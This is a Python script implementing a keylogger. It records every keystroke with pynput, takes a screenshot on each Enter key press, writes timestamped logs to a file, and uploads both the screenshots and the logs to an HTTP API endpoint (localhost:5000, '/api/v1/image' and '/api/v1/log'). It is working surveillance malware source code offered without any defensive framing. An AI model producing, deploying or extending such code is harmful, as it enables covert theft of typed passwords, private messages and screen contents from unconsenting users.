import pynput
import pyautogui
import secrets
import requests
import time
from datetime import datetime
from pynput.keyboard import Listener

s = requests.Session()
start_time = time.time()
write_this = ''

def log_keystroke(key):
    
    global write_this
    global start_time

    key = str(key).replace("'", "")

    if key == 'Key.esc':
        return False
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
         key = ''
    if key == "Key.enter":
        key = '\n'
        take_screenshot = pyautogui.screenshot()
        file_name = datetime.now().strftime("%d-%b-%Y %H.%M.%S") + '.jpg'
        take_screenshot.save(f'screenshot\\{file_name}')

        files = {'upload_file': open('screenshot\\' + file_name, 'rb')}
        r = s.post("http://127.0.0.1:5000/api/v1/image", files=files)

    write_this += key
    current_time = time.time()
    format_time = time.ctime(current_time)
    total_time = current_time - start_time
    print(total_time)
    if total_time >= 10:
        if write_this != '': 
            with open("log.txt", 'a') as f:
                write_this = str(format_time) + " >> " + write_this + "\n"
                f.write(f"{write_this}")
                files = {'upload_file': open('log.txt','rb')}
                print(files)
                r = s.post("http://127.0.0.1:5000/api/v1/log", files=files)
                write_this = ''
                start_time = time.time()


with Listener(on_press=log_keystroke) as l:
    # print("asd")
    l.join()
